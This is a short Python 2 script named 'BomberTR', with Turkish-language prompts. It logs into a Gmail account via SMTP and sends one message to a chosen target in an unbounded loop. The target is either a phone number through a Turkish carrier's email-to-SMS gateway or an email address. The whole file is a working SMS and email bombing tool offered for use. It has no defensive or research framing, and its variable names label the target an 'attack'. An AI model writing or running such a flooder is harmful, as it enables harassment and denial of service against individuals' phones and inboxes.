# Name: BomberTR.py
# Made bytarikesen on Github


import smtplib as s
import getpass

print"BomberTR by Tarik Esen \n\r"
print"Lutfen Gmail Hesabiniz Ile Giris Yapin \n\r"

username = raw_input("E-Mail(kullanici@gmail.com): ")
password = getpass.getpass(prompt='Gmail Sifreniz: ')

obj = s.SMTP("smtp.gmail.com:587")
obj.starttls()
obj.login(username, password)
print"\n\r"

print """ Lutfen Kullanmak Istediginiz Platformu Seciniz(No Giriniz)

1. SMS
2. Email

"""
option = input()
print("\n\r")
if option == 1:
    carrier_attack = 0
    print """ Lutfen Hangi Operatore Gondermek Istediginizi Secin(No Giriniz)
	1. Vodafone
	2. Turk Telekom/Avea
	3. Turkcell
	
"""
    carrier = input()

    if carrier == 1:
	carrier_attack = "@vodafone.com.tr"
    if carrier == 2:
	carrier_attack = "@turktelekom.com.tr"
    if carrier == 3:
	carrier_attack = "@turkcell.com.tr"
    

    v_phone = raw_input("Hedef Telefon Numarasi: ") + str(carrier_attack)
    message = raw_input("Mesaj: ")
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (username, "" .join(v_phone), "" .join(message)))

    while 1:
        obj.sendmail(username, v_phone, phone_message)
	print "Mesaj Gonderiliyor...Islemi Durdurmak Icin Ctrl+C Yapiniz."

if option == 2:
    v_email = raw_input("Hedef E-Mail: ")
    message = raw_input("Mesaj: ")
    email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
       % (username, "" .join(v_email), "" .join(message)))

    while 1:
        obj.sendmail(username, v_email, email_message)
	print "Mail Gonderiliyor...Islemi Durdurmak Icin Ctrl+C Yapiniz."